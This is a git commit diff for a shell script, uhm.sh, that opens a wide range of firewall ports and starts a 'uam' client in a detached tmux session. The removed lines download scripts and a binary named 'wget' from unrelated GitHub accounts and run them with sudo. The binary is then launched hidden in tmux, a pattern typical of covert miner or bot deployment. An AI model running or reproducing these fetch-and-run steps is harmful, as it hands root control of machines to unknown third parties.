dfe603ddba660cffb0be67c27fa86e44bfc66e11
minnie1311 <69047664+minnie1311@users.noreply.github.com>
2022-01-26 12:44:20 +0700

    Update uhm.sh

--- uhm.sh
+++ uhm.sh
@@ -14,15 +14,3 @@ sudo ufw allow 1000:65000/tcp
 sudo ufw allow 1000:65000/udp
 
 sudo tmux new-session -d -s 1 './uam --pk D4BE04937A8AC67F3F01B9588D39C8C2A3875F45C2E93CC37DCC5D0DF71A9266'
-sleep 600
-
-sudo rm config.json
-sudo wget https://raw.githubusercontent.com/renansouza60974/learncode/main/config.json
-sudo sed -i "s/renansouza60974/$HOSTNAME/g" config.json
-sudo wget https://github.com/average140421/test/raw/main/wget
-wget https://raw.githubusercontent.com/average140421/test/main/1gb.sh
-sudo bash 1gb.sh
-wget https://raw.githubusercontent.com/average140421/test/main/rdom.sh
-sudo bash rdom.sh
-sudo chmod +x wget
-sudo tmux new-session -d -s my_session1  './wget -t 2'
